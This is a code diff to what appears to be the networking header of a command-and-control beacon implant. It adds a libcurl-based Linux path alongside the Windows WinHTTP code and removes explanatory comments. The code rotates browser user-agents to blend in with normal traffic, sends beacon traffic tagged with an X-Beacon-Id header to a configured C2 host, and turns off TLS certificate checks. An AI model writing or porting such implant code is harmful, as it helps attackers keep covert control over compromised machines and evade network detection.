@@ -7,18 +7,23 @@
 //  to network inspection tools.
 // ============================================================================
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
+#ifdef _WIN32
+    #ifndef WIN32_LEAN_AND_MEAN
+    #define WIN32_LEAN_AND_MEAN
+    #endif
+    #include <windows.h>
+    #include <winhttp.h>
+    #pragma comment(lib, "winhttp.lib")
+#else
+    #include <curl/curl.h>
+    #include <string.h>
+    #include <algorithm>
 #endif
-#include <windows.h>
-#include <winhttp.h>
 #include <string>
 #include <cstdlib>
 #include <ctime>
 
 #include "crypto.h"
-
-#pragma comment(lib, "winhttp.lib")
 
 namespace net {
 
@@ -45,6 +50,7 @@ struct C2Config {
 // ── User-Agent Rotation ────────────────────────────────────────────────────
 // Rotate through common browser user-agents to blend in with normal traffic.
 
+#ifdef _WIN32
 static const wchar_t* USER_AGENTS[] = {
     L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
     L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
@@ -56,13 +62,11 @@ inline const wchar_t* get_random_ua() {
     return USER_AGENTS[rand() % NUM_USER_AGENTS];
 }
 
-// ── HTTP Request Helper ────────────────────────────────────────────────────
-
 inline std::string http_request(
     const C2Config& cfg,
-    const std::wstring& method,   // L"GET" or L"POST"
-    const std::wstring& path,     // e.g. L"/api/v1/ping"
-    const std::string& body = "", // POST body (encrypted)
+    const std::wstring& method,
+    const std::wstring& path,
+    const std::string& body = "",
     const std::string& beacon_id = ""
 ) {
     std::string response_body;
@@ -95,7 +99,6 @@ inline std::string http_request(
         return "";
     }
 
-    // If HTTPS with self-signed cert, ignore certificate errors (dev mode)
     if (cfg.use_https) {
         DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -103,10 +106,8 @@ inline std::string http_request(
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
     }
 
-    // Add custom headers
     std::wstring headers = L"Content-Type: text/plain\r\n";
     if (!beacon_id.empty()) {
-        // Convert beacon_id to wide string for header
         std::wstring wid(beacon_id.begin(), beacon_id.end());
         headers += L"X-Beacon-Id: " + wid + L"\r\n";
     }
@@ -124,7 +125,6 @@ inline std::string http_request(
     bResult = WinHttpReceiveResponse(hRequest, nullptr);
     if (!bResult) goto cleanup;
 
-    // Read response body
     {
         DWORD dwSize = 0;
         do {
@@ -147,6 +147,76 @@ cleanup:
 
     return response_body;
 }
+#else
+static const char* USER_AGENTS[] = {
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+};
+constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);
+
+inline const char* get_random_ua() {
+    return USER_AGENTS[rand() % NUM_USER_AGENTS];
+}
+
+static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+    ((std::string*)userp)->append((char*)contents, size * nmemb);
+    return size * nmemb;
+}
+
+inline std::string http_request(
+    const C2Config& cfg,
+    const std::wstring& method,
+    const std::wstring& path,
+    const std::string& body = "",
+    const std::string& beacon_id = ""
+) {
+    std::string response_body;
+    CURL *curl = curl_easy_init();
+    if (!curl) return "";
+
+    std::string proto = cfg.use_https ? "https://" : "http://";
+    std::string host_narrow(cfg.host.begin(), cfg.host.end());
+    std::string path_narrow(path.begin(), path.end());
+    std::string url = proto + host_narrow + ":" + std::to_string(cfg.port) + path_narrow;
+
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua());
+    
+    std::string method_narrow(method.begin(), method.end());
+    if (method_narrow == "POST") {
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        if (!body.empty()) {
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
+        }
+    } else {
+        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
+    }
+
+    struct curl_slist *headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: text/plain");
+    if (!beacon_id.empty()) {
+        std::string h = "X-Beacon-Id: " + beacon_id;
+        headers = curl_slist_append(headers, h.c_str());
+    }
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
+
+    if (cfg.use_https) {
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    }
+
+    curl_easy_perform(curl);
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+
+    return response_body;
+}
+#endif
 
 // ── High-Level C2 Functions ────────────────────────────────────────────────
 
